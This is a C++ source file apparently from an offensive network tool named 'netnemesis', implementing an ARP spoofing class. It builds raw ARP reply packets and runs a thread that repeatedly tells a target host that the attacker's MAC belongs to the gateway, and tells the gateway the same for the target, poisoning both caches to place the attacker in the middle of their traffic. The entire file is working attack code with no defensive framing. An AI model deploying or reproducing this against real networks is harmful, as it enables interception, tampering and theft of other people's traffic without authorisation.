#include "netnemesis.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

struct arp_packet {
    struct ethhdr eth;
    struct arphdr arp;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

ArpSpoofer::ArpSpoofer() : raw_socket(-1), running(false) {}

ArpSpoofer::~ArpSpoofer() {
    stop();
}

bool ArpSpoofer::initialize(const std::string &iface) {
    interface = iface;
    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_socket < 0) {
        Utils::logError("Unable to create ARP socket");
        return false;
    }
    return true;
}

void ArpSpoofer::sendArpPacket(const std::string &src_ip, const std::string &src_mac,
                                const std::string &dst_ip, const std::string &dst_mac,
                                bool is_reply) {
    arp_packet packet;
    memset(&packet, 0, sizeof(packet));
    
    // Ethernet header
    sscanf(dst_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &packet.eth.h_dest[0], &packet.eth.h_dest[1], &packet.eth.h_dest[2],
           &packet.eth.h_dest[3], &packet.eth.h_dest[4], &packet.eth.h_dest[5]);
    sscanf(src_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &packet.eth.h_source[0], &packet.eth.h_source[1], &packet.eth.h_source[2],
           &packet.eth.h_source[3], &packet.eth.h_source[4], &packet.eth.h_source[5]);
    packet.eth.h_proto = htons(ETH_P_ARP);
    
    // ARP header
    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(ETH_P_IP);
    packet.arp.ar_hln = 6;
    packet.arp.ar_pln = 4;
    packet.arp.ar_op = htons(is_reply ? ARPOP_REPLY : ARPOP_REQUEST);
    
    // ARP payload
    memcpy(packet.sender_mac, packet.eth.h_source, 6);
    inet_pton(AF_INET, src_ip.c_str(), packet.sender_ip);
    memcpy(packet.target_mac, packet.eth.h_dest, 6);
    inet_pton(AF_INET, dst_ip.c_str(), packet.target_ip);
    
    // Invia
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = if_nametoindex(interface.c_str());
    
    sendto(raw_socket, &packet, sizeof(packet), 0, (struct sockaddr *)&sa, sizeof(sa));
}

void ArpSpoofer::poisonLoop(const std::string &target_ip, const std::string &gateway_ip) {
    std::string my_mac = Utils::getMacAddress(interface);
    std::string target_mac = "ff:ff:ff:ff:ff:ff"; // Broadcast, poi si aggiorna
    std::string gateway_mac = "ff:ff:ff:ff:ff:ff";
    
    Utils::logAttack("ARP spoofing active: " + target_ip + " <-> " + gateway_ip);
    
    while (running) {
        // Tell the target that I am the gateway
        sendArpPacket(gateway_ip, my_mac, target_ip, target_mac, true);
        // Tell the gateway that I am the target
        sendArpPacket(target_ip, my_mac, gateway_ip, gateway_mac, true);
        
        sleep(2); // Keepalive ogni 2 secondi
    }
}

void ArpSpoofer::startPoisoning(const std::string &target_ip, const std::string &gateway_ip) {
    running = true;
    poison_thread = std::thread(&ArpSpoofer::poisonLoop, this, target_ip, gateway_ip);
}

void ArpSpoofer::stop() {
    running = false;
    if (poison_thread.joinable()) poison_thread.join();
    if (raw_socket >= 0) close(raw_socket);
}